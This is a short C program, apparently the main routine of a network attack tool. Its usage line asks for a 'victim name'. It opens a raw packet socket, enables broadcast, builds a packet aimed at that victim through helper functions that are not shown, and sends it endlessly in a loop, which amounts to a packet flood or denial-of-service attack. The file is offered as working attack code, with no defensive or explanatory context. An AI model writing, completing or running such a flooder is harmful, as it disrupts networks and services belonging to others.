#include "lobo.h"

int main(int argc,char** argv)
{
    if(argc!=2)
    {
        fprintf(stderr,"Usage: <%s> <victim name>\n",argv[0]);
        exit(EXIT_FAILURE);
    }

    struct sockaddr_ll addr;
    socklen_t addr_len=sizeof(struct sockaddr_ll);
    memset(&addr,0,addr_len);
    fill_struct(&addr);

    int sock_fd;
    sock_fd=socket(AF_PACKET,SOCK_RAW,htons(ETH_P_IP));
    check_function(sock_fd,"socket");
    setuid(getuid());

    int status;
    const int on=TRUE;
    status=setsockopt(sock_fd,SOL_SOCKET,SO_BROADCAST,&on,sizeof(on));
    check_function(status,"setsockopt");

    char send_buffer[BUFFER_SIZE];
    fill_buffer(send_buffer,argv[1],sock_fd);

    while(TRUE)
    {
        status=sendto(sock_fd,send_buffer,BUFFER_SIZE,0,
        (struct sockaddr*)&addr,addr_len);
        check_function(status,"sendto");
    }

    close(sock_fd);
    return 0;
}